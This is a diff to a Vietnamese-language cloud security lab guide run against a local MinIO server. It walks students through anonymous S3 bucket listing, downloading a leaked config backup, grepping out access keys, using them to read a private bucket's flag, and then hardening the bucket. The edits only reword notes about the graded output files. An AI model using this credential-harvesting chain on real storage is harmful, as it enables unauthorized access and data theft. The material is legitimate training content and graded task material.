@@ -125,7 +125,7 @@ Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại di�
 
 > **Ghi chú credential giả:** Mọi access key/secret key trong bài là **giả, do lab sinh ra**, chỉ có tác dụng trong môi trường MinIO cục bộ này, không phải credential AWS thật.
 
-> **Ghi chú chấm điểm:** Ở mỗi nhiệm vụ, sinh viên cần lưu đúng kết quả vào các file quy ước trong thư mục `$HOME` (như hướng dẫn ở từng bước) — đây là các file mà hệ thống sẽ thu thập để chấm điểm tự động. Nếu không thực hiện đúng chuỗi khai thác/hardening thực sự, nội dung các file này sẽ không khớp và nhiệm vụ sẽ không đạt.
+> **Ghi chú:** Mỗi nhiệm vụ yêu cầu lưu đúng kết quả vào các file trong thư mục `$HOME` như hướng dẫn ở từng bước. Các file này phải phản ánh kết quả thật của chuỗi khai thác/hardening — nếu không thực hiện đúng, nội dung sẽ không khớp và nhiệm vụ không đạt.
 
 ---
 
@@ -138,14 +138,14 @@ Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại di�
 curl -s http://172.33.0.30:9000/public-assets/?list-type=2 | head -40
 ```
 
-**Bước 2:** Dùng `aws-cli` liệt kê object trong bucket nghi ngờ bằng chế độ không ký request, đồng thời lưu bằng chứng vào file quy ước:
+**Bước 2:** Dùng `aws-cli` liệt kê object trong bucket nghi ngờ bằng chế độ không ký request, đồng thời lưu kết quả ra file:
 ```bash
 aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://public-assets --recursive --no-sign-request \
   | tee /tmp/list.out
 ( grep -q 'backup/app-backup' /tmp/list.out && echo -n LISTED || echo -n NOLIST ) > ~/recon_list_status.txt
 ```
 
-**Bước 3:** Xác nhận quyền đọc ẩn danh (bằng chứng bucket bị public), đồng thời lưu bằng chứng:
+**Bước 3:** Xác nhận quyền đọc ẩn danh (bằng chứng bucket bị public), đồng thời lưu kết quả:
 ```bash
 # Tai mot object tinh ma KHONG dung credential -> chung minh GetObject an danh
 aws --endpoint-url http://172.33.0.30:9000 s3 cp s3://public-assets/static/notice.txt - --no-sign-request
@@ -183,7 +183,7 @@ cat ~/loot/app-config.env
 grep -rniE 'access_?key|secret_?key' ~/loot/
 ```
 
-**Bước 4:** Trích đúng access key và secret key ra 2 file riêng (KHÔNG kèm nhãn, KHÔNG có khoảng trắng/thừa dòng) — đây là file dùng để chấm điểm:
+**Bước 4:** Trích đúng access key và secret key ra 2 file riêng (KHÔNG kèm nhãn, KHÔNG có khoảng trắng/thừa dòng):
 ```bash
 grep '^AWS_ACCESS_KEY_ID='     ~/loot/app-config.env | cut -d= -f2 | tr -d '\r\n ' > ~/creds_access_key.txt
 grep '^AWS_SECRET_ACCESS_KEY=' ~/loot/app-config.env | cut -d= -f2 | tr -d '\r\n ' > ~/creds_secret_key.txt
@@ -213,7 +213,7 @@ export AWS_DEFAULT_REGION=us-east-1
 aws --endpoint-url http://172.33.0.30:9000 s3 ls
 ```
 
-**Bước 3:** Liệt kê nội dung bucket private và tải object chứa flag về đúng file quy ước `~/loot.txt`:
+**Bước 3:** Liệt kê nội dung bucket private và tải object chứa flag về đúng file `~/loot.txt`:
 ```bash
 aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://secure-data --recursive
 aws --endpoint-url http://172.33.0.30:9000 s3 cp s3://secure-data/confidential/flag.txt ~/loot.txt
@@ -253,7 +253,7 @@ aws --endpoint-url http://172.33.0.30:9000 s3api put-bucket-versioning \
   --bucket secure-data --versioning-configuration Status=Enabled
 ```
 
-**Bước 4:** Xác minh trạng thái cuối và lưu bằng chứng — đây là các file dùng để chấm điểm. Chạy CHÍNH XÁC 2 khối lệnh sau (mỗi khối tạo 1 file, dựa trên phản hồi THẬT từ MinIO):
+**Bước 4:** Xác minh trạng thái cuối và lưu kết quả. Chạy CHÍNH XÁC 2 khối lệnh sau (mỗi khối tạo 1 file, dựa trên phản hồi THẬT từ MinIO):
 ```bash
 # 4a. anonymous list PHẢI thất bại (AccessDenied) sau khi đã gỡ policy
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
